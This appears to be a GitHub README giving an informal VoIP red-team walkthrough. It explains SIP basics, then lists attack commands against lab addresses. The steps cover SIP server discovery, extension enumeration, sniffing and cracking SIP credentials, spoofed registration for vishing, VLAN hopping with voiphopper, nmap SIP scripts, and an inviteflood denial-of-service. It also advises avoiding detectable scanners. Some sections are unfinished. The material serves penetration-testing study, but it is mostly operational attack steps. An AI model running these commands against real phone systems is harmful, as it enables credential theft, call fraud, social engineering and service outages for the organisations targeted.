# VOIP-Red-Team

VOIP -- Voice Over IP (Internet Protocol) -- is a technology which is used to transmit the voice over to the other phones over internet througn IP. 

The technology is based on a SIP (Session Initiation Protocol), is like a program or more specifically the programming which is transmitting the VOICE or VIDEO on
real-time basis via RTP (Real Time Protocol).

SIP works similar like HTTP, where we request the client to connect, client sends an acknowledgement, and then on RTP VOICE or VIDEO starts getting exchanged.

Image demonstration -- http://www.en.voipforo.com/SIP/SIP_example.php

Request types in SIP --

REGISTER — Sends request to the VOIP server to register the user.
INVITE — Invites a user to join the conversation. 
ACK — An acknowledgement or confirmation, that user is ok to join the call.
CANCEL — Canceling the call in waiting list. 
OPTIONS — to list all these options that the client has.
BYE — Ends the call.
REFER — means receiver needs to communicate through a 3rd party.

So, VOIP (SIP) service default ports are -- 5060 and 5061, and in some cases 2000 is also there

5060 - Unencrypted (TCP/UDP)
5061 - Encrypted (SIP-TLS)
2000 - CISCO SCCP - Skinny protocol (proprietry VOIP protocol used by CISCO)

So, let's begin, 

Enumeration --- The very fist and foremost is to find the VOIP server, now there can be multiple tools that can be used here:

1. NMAP - via service scan 
2. Port scanners -- Advanced port scanners
3. and svmap 

In real-time scenarios (NMAP or other know service scanners should be avoided as it's signatures can be easily detected by the security solutions).

So, let's start with svmap 

1. ifconfig    

################ Locating the VOIP Servers ##################

2. svmap 192.168.1.0/24 --- u can chose the subnet to scan (Either VOICE or DATA)

######################## Finding the extensions allocated or registered ####################################

3. svwar -e1100-1600 192.168.1.127 -m INVITE (u can try to guess from the phone which is placed near to u, support the number present is 177, it means range can start from 100-999), but go slow.


4. Sniffing or dumping authentication data.

sudo sipdump -i eth0 test.txt

5. Cracking the authentication
sudo sipcrack -w /usr/share/wordlists/dirb/common.txt test.txt

######################################## SPOOFING ############################################

6. Now create a REGISTRATION with any cracked account and we are done with "SPOOFING"

Now with this multiple attacks in real-time scenarios can be done:

1. Vishing -- calling to extract as much as data such as passwords, or compromising the crown jwells etc.

2. 

##########################################################################


7 ############################ Sniffing and Man In the Middle Attack ####################

Cain and Abel Demonstration

8  ############################## VLAN Hopping ################################

Now let's suppose u r in real-time scenarios but when connecting to the LAN, u r in a DATA VLAN but with not much access, so let's suppose in my experience when I wanted to compromise the cameras, but those cameras were present in some other VLAN, so what I did was VLAN hopping, which is very simple using 

VOIPHOPPER oR Yersinia (I like Yersinia, but u can also go with voiphopper which is very easy (but if very restricted environment which I have not seen yet, it will be detected)

So, let's go for demonstration

ifconfig

sudo voiphopper -i eth0 -z

sudo voiphopper -i eth0 -a -m 00:0c:29:e2:40:4a  (by setting the LLDP packets)


#####################################################################################

9. Opening the 443 and 80 port for VOIP Server web page auth bypass,

http://192.168.1.127/   

####################################################################


From Penetration Testing approach

U can btw can perform numerous server level attacks such as to go first by Nessus and believe me many a times u will a lot of server level access vulnerabilties

sudo nmap --script=sip-methods 192.168.1.127 -p 5060 -sU

sudo nmap --script=sip* 192.168.1.127 -p 5060 -sU

sudo nmap  192.168.1.127  -T2 -A -sU

############################### DOS Attacks #######################

sudo inviteflood eth0 1122 192.168.1.107 192.168.1.128 100000000000000000

###########################################################################


Futher there can be other malicious attacks such as RTP Injection, VOICE MAIL Spoofing or firwmware attakcs, etc.
